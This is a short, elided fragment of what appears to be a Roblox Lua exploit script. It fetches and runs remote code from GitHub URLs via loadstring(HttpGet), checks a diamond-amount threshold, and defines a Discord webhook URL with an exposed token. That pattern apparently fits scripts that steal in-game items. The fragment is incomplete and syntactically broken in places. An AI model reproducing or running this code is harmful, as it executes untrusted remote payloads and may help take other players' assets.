...
if _G.LoadingScreen ~= false then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/StickOgh01/Shit/main/LoadingScreen'))() -- 
end
...
if diaamt < 110000 then
    ...
    _G.AntiLeave = false
    _G.MouseLock = false
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/blabla/blabla/main/bank.lua", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
    return;
end
...
-- Webhook
local url = https://discord.com/api/webhooks/1131892689965699082/aWGfHVZFXNZ4lEfM48naBL7yhszWmBcWttV3aDSpPASEAXXIJ7o1dRSNDD52jBXNYNoj
